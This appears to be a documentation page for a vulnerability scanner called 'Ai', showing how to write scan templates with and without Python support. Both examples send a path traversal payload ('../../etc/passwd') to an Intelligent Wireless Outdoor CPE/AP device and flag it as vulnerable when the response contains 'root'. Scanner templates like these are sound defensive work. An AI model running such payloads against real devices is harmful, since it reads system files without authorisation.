<h1 align="center">Ai</h1>
<h4 align="center">Python support</h4>

## Description
Ai supports Python as external not internal but It can still work normally like Python and use PythonShell every time you want to execute python codes. For more information visit [python-shell](https://npmjs.com/package/python-shell)

## Template example
Python support:
```
information:
  name: Intelligent Wireless Outdoor CPE/AP
  id: iwoca-pathtraversal
  description: Intelligent Wireless Outdoor CPE/AP path traversal vulnerable
  risk: medium
  authors: I2rys
  tags: iwoca, path-traversal, Intelligent Wireless Outdoor CPE/AP, Intelligent-Wireless-Outdoor

code: |
  PythonShell.runString(`import requests

  response = requests.get("{{url}}/cgi-bin/showhtml?page=../../etc/passwd")

  if response.text.find("root") != -1:
     print("true")
  else:
     print("false")`, null, function(err, result){
     if(result[0] == "true"){
         Logger.attack_log({{self_info}}, "{{url}}/cgi-bin/showhtml?page=../../etc/passwd")
     }

     resolve()
  })
```

No Python support:
```
information:
  name: Intelligent Wireless Outdoor CPE/AP
  id: iwoca-pathtraversal
  description: Intelligent Wireless Outdoor CPE/AP path traversal vulnerable
  risk: medium
  authors: I2rys
  tags: iwoca, path-traversal, Intelligent Wireless Outdoor CPE/AP, Intelligent-Wireless-Outdoor

code: |
  let path = "/cgi-bin/showhtml?page=../../etc/passwd"
  let response = await _MakeQuest_(`{{url}}${path}`)
  
  if(response.data.indexOf("root") != -1){
    Logger.attack_log({{self_info}}, `{{url}}${path}`)
  }

  resolve()
```
